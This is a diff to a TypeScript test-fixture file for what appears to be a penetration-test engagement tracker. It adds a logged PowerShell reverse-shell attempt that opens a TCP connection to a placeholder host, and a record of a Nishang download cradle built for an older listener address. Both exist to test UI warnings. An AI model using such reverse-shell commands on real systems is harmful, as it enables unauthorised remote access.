@@ -331,7 +331,18 @@ const payLog: LogEntry[] = [
     "'nc.exe' is not recognized as an internal or external command,\noperable program or batch file.", ["h-pay-iis"],
     { engagementId: "e-pay", at: ago(25 * HOUR), payloadId: "nc-exe", payloadValues: { LHOST: "192.0.2.10", LPORT: "443" } },
   ),
+  // A second reverse shell that failed here: two failures make the Callbacks chip amber ("Callbacks failed here twice").
+  cmd(
+    "PowerShell TLS shell · 198.51.100.20", "$c=New-Object Net.Sockets.TCPClient('192.0.2.10',443)",
+    "Access is denied.", ["h-pay-iis"],
+    { engagementId: "e-pay", at: ago(24 * HOUR), payloadId: "ps-tls", payloadValues: { LHOST: "192.0.2.10", LPORT: "443" } },
+  ),
 ].map((e, i) => ({ ...e, id: `l-pay-${i + 1}` }));
+
+// The Nishang cradle was built for an older LHOST, so its block opens with "Rebuild first: built with ..., now ...".
+const payloadBuilds: PayloadBuild[] = [
+  { engagementId: "e-pay", hostId: "h-pay-iis", payloadId: "nishang-cradle", lhost: "192.0.2.77", lport: "4444", at: ago(30 * HOUR) },
+];
 
 const log: LogEntry[] = [...labLog, ...examLog, ...payLog];
 
@@ -541,7 +552,7 @@ const settings: Settings = {
 
 export const FIXTURES: AuditFixtures = {
   engagements, hosts, services, log, attachments, checklist, notes, ruledOut, hostIdentity, vectors, tunnels, hops, credentials, usernames,
-  credAttempts, triedPairs, payloadBuilds: [], extractions, accessGrants, findings, findingFiles, failedAttempts, cleanup, backups, settings,
+  credAttempts, triedPairs, payloadBuilds, extractions, accessGrants, findings, findingFiles, failedAttempts, cleanup, backups, settings,
 };
 
 export const FIXTURE_PROGRESS = progress;
